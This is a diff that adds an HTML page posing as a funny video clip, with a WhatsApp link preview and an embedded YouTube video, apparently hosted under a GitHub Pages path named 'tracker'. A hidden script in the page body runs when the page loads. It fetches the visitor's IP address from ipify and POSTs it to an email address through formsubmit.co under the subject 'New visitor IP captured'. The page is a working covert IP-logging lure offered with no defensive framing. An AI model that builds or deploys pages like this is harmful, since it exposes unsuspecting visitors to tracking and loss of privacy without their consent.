@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>😂 Funniest Clip Ever</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- WhatsApp preview (OpenGraph) -->
+  <meta property="og:title" content="😂 Funniest Clip Ever">
+  <meta property="og:description" content="You won't stop laughing!">
+  <meta property="og:url" content="https://yourusername.github.io/tracker/">
+
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 40px; }
+    img { max-width: 90%; border-radius: 12px; }
+  </style>
+</head>
+<body>
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/BYeWNfsWQa8?si=1dKx0_sQq8H4r3Zx" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+    <!-- <iframe src="https://www.youtube.com/embed/14?autoplay=1&mute=1" title="FUNNIEST Dad Moves! 😆 Best Fail Videos 2025" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe> -->
+  <!-- <img src="preview.jpg" alt="Funny Meme" />
+  <p>Loading content...</p> -->
+
+  <script>
+    // Step 1: Get IP via AJAX
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+
+        // Step 2: Submit form data via AJAX POST (no redirect)
+        fetch("https://formsubmit.co/ajax/ouube@mailto.plus", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            IP: ip,
+            _subject: "New visitor IP captured",
+            _captcha: false
+          })
+        });
+      });
+  </script>
+</body>
+</html>
